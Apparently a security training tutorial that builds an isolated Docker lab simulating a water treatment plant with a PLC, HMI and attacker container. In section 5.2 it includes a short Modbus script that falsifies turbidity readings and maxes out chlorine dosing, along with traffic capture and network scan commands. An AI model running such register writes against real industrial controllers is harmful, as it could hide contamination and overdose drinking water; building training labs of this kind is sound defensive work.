Prerequisites
Install these on your host machine before anything else.
Docker Desktop / Engine
v24+ on Windows/Mac/Linux. Enable WSL2 backend on Windows. Minimum 4 GB RAM allocated to Docker.
Docker Compose v2
Bundled with Docker Desktop. Check with: docker compose version
Git
To clone repos and manage your simulation source code.
Python 3.10+
For writing the simulation physics model locally before containerising it.
✓
Hardware: 8 GB RAM recommended (4 GB minimum). 10 GB free disk. Any modern CPU — no VT-x/AMD-V requirement since you are not running full VMs.
1
Create the Docker bridge network
All containers communicate on a dedicated bridge network with static IPs — mirrors the VM host-only network.
1.1
Create isolated bridge network
▶
Creates a network named wtp-net with the subnet 192.168.95.0/24 — matching the VM setup exactly so all IPs stay the same.
bash
docker network create \
  --driver bridge \
  --subnet 192.168.95.0/24 \
  --gateway 192.168.95.1 \
  wtp-net
verify
docker network inspect wtp-net
# Should show Subnet: 192.168.95.0/24

2
Simulation container
Python Flask physics engine + Modbus TCP bridge. This is your custom code — the only container you write from scratch.
2.1
Project folder structure
▶
directory layout
wtp-simulation/
├── Dockerfile
├── requirements.txt
├── simulation.py       # physics model
├── remote_io.py        # Modbus TCP bridge
└── api.py              # Flask JSON API
2.2
Write the Dockerfile
▶
wtp-simulation/Dockerfile
FROM python:3.11-slim

WORKDIR /app
COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt

COPY . .

# Flask JSON API on 5010, Modbus TCP on 502
EXPOSE 5010 502

CMD ["sh", "-c", "python remote_io.py & python api.py"]
requirements.txt
flask==3.0.0
pymodbus==3.5.4
numpy==1.26.0
2.3
Build and run the simulation container
▶
bash
cd wtp-simulation

# Build image
docker build -t wtp-sim .

# Run with static IP on wtp-net
docker run -d \
  --name wtp-sim \
  --network wtp-net \
  --ip 192.168.95.10 \
  -p 5010:5010 \
  -p 5020:502 \
  wtp-sim
ℹ
Host port 5020 maps to container port 502 (Modbus). This avoids a root permission conflict — port 502 below 1024 requires root on some systems. The PLC container connects to 192.168.95.10:502 directly inside the Docker network, bypassing the host mapping.
3
PLC container — OpenPLC
Pull the pre-built OpenPLC image. No custom Dockerfile needed — just run and configure via the web UI.
3.1
Pull and run OpenPLC container
▶
bash
docker run -d \
  --name wtp-plc \
  --network wtp-net \
  --ip 192.168.95.2 \
  -p 8080:8080 \
  -p 502:502 \
  tuttas/openplc_v3

# Web UI: http://localhost:8080
# Login:  openplc / openplc
# Modbus: localhost:502
3.2
Upload ladder logic program via web UI
▶
Open http://localhost:8080 → Programs → Upload your wtp_control.st file → Start runtime.
wtp_control.st — key logic
VAR
  turb_filt  AT %IW0 : INT;   (* reg 40004 — filter outlet NTU *)
  alum_pump  AT %QW0 : INT;   (* actuator — alum dose RPM *)
  cl2_valve  AT %QW1 : INT;   (* actuator — Cl2 valve % *)
END_VAR

(* Turbidity-based alum dosing control *)
IF turb_filt > 150 THEN
  alum_pump := 100;
ELSIF turb_filt > 80 THEN
  alum_pump := 60;
ELSE
  alum_pump := 30;
END_IF;
3.3
Configure simulation as Modbus slave device
▶
In OpenPLC web UI → Slave Devices → Add Device:
settings
Device type:  Generic Modbus TCP Device
IP address:   192.168.95.10      (simulation container)
Port:         502
Slave ID:     1
Poll rate:    100ms
ℹ
Inside the Docker network, container-to-container traffic uses the internal IPs directly on port 502 — no port remapping needed. The PLC polls the simulation at 192.168.95.10:502, and the HMI polls the PLC at 192.168.95.2:502.

5
Attacker container
A lightweight Ubuntu container with all attack and analysis tools pre-installed. Sits on the same network as all other containers.
5.1
Build the attacker image
▶
attacker/Dockerfile
FROM ubuntu:22.04

ENV DEBIAN_FRONTEND=noninteractive

RUN apt-get update && apt-get install -y \
    python3 python3-pip \
    nmap tcpdump wireshark-common tshark \
    netcat-openbsd iputils-ping curl git \
    && pip3 install pymodbus scapy mbtget \
    && rm -rf /var/lib/apt/lists/*

WORKDIR /attacks
COPY scripts/ .

CMD ["bash"]
bash
cd attacker
docker build -t wtp-attacker .
docker run -it \
  --name wtp-attacker \
  --network wtp-net \
  --ip 192.168.95.6 \
  --cap-add NET_ADMIN \
  --cap-add NET_RAW \
  wtp-attacker
5.2
Run attack scripts from inside container
▶
sensor_spoof.py
from pymodbus.client import ModbusTcpClient

client = ModbusTcpClient('192.168.95.2', port=502)
client.connect()

# Spoof filter turbidity to 0.01 NTU (looks clean)
client.write_register(3, 1, slave=1)

# Overdose Cl2 — set dosing register to max
client.write_register(9, 9999, slave=1)

print("Attack active — HMI shows clean, pipe is contaminated")
capture traffic
# Inside attacker container — capture all Modbus traffic
tshark -i eth0 -f "tcp port 502" -w /tmp/modbus.pcap

# Scan all containers for open ports
nmap -p 502,8080,9090,5010 192.168.95.0/24
6
docker-compose.yml — run everything at once
The single file that replaces all individual docker run commands. One command brings up the entire lab.
6.1
Complete docker-compose.yml
▶
docker-compose.yml
version: '3.8'

networks:
  wtp-net:
    driver: bridge
    ipam:
      config:
        - subnet: 192.168.95.0/24
          gateway: 192.168.95.1

services:

  simulation:
    build: ./wtp-simulation
    container_name: wtp-sim
    networks:
      wtp-net:
        ipv4_address: 192.168.95.10
    ports:
      - "5010:5010"   # Flask JSON API
      - "5020:502"    # Modbus TCP (host:container)
    restart: unless-stopped

  plc:
    image: tuttas/openplc_v3
    container_name: wtp-plc
    networks:
      wtp-net:
        ipv4_address: 192.168.95.2
    ports:
      - "8080:8080"   # OpenPLC web UI
      - "502:502"     # Modbus TCP to HMI/attacker
    depends_on:
      - simulation
    restart: unless-stopped

  hmi:
    image: scadalts/scadalts:latest
    container_name: wtp-hmi
    networks:
      wtp-net:
        ipv4_address: 192.168.95.5
    ports:
      - "9090:8080"   # HMI web UI
    depends_on:
      - plc
    restart: unless-stopped

  attacker:
    build: ./attacker
    container_name: wtp-attacker
    networks:
      wtp-net:
        ipv4_address: 192.168.95.6
    cap_add:
      - NET_ADMIN
      - NET_RAW
    stdin_open: true
    tty: true
    profiles:
      - attack   # only starts with --profile attack
6.2
Start, stop, and manage the lab
▶
common commands
# Start the full lab (simulation + PLC + HMI)
docker compose up -d

# Start including the attacker container
docker compose --profile attack up -d

# View all running containers
docker compose ps

# Follow logs from PLC
docker compose logs -f plc

# Shell into attacker container
docker exec -it wtp-attacker bash

# Stop everything
docker compose down

# Stop + wipe all volumes
docker compose down -v
7
Verify end-to-end data flow
Run these checks in order after docker compose up. Each one confirms a link in the chain.
1
Simulation API responding
curl http://localhost:5010/api/sensors
2
Modbus port open on PLC
nmap -p 502 localhost
3
OpenPLC web UI accessible
open http://localhost:8080
4
HMI web UI accessible
open http://localhost:9090/ScadaBR
5
Read Modbus register from attacker
mbtget -r 1 -t 4 192.168.95.2
6
HMI shows live sensor values
Watch Data Sources → Real-time values update
⚠
The attacker container has NET_ADMIN and NET_RAW capabilities. Keep the entire compose stack isolated — never add an internet-facing port mapping to any container in this lab.
✓
Total setup time with Docker is approximately 15–30 minutes compared to 4–6 hours for the full VM approach. The entire lab state can be snapshotted with docker commit and shared as a tar archive.
